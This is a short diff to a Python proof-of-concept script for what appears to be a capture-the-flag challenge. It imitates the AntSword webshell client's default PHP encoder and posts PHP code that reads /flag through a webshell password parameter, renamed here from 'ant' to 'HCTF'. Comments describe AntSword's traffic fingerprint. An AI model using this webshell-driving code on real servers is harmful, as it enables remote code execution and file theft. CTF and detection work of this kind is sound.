@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # web_antshell PoC：模拟「中国蚁剑」默认配置（PHP / default 编码器 / default 解码器）
-# 连接 ant.php 取回 /flag。蚁剑默认编码器把整段 PHP 明文放进连接密码参数，
+# 连接站点（index.php）取回 /flag。蚁剑默认编码器把整段 PHP 明文放进连接密码参数，
 # 头部 @ini_set(...) 前缀 + open_basedir 探测 + asoutput() 输出函数即其流量指纹。
 # Usage: python exp.py [base_url]      (default http://127.0.0.1:8080)
 import random
@@ -39,7 +39,7 @@ def main():
     payload, tag_s, tag_e = build('echo @file_get_contents("/flag");')
     req = urllib.request.Request(
         BASE + "/",
-        data=urllib.parse.urlencode({"ant": payload}).encode(),
+        data=urllib.parse.urlencode({"HCTF": payload}).encode(),
         # 蚁剑 UA 为随机浏览器 UA（random-fake-useragent），本题不校验 UA
         headers={"User-Agent": "Mozilla/5.0"},
     )
